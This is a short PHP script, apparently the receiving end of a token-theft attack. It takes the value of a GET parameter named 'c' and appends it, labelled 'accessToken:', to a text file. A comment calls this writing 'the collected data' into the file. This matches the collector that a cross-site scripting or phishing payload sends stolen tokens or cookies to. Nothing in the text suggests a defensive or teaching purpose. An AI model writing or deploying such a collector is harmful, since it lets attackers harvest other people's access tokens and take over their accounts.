// Write the collected data into a file.

<?php
$accessToken = $_GET['c'];
$fp = fopen('accessTokens.txt', 'a+');
fwrite($fp, 'accessToken:' .$accessToken."\r\n");
fclose($fp);
?>
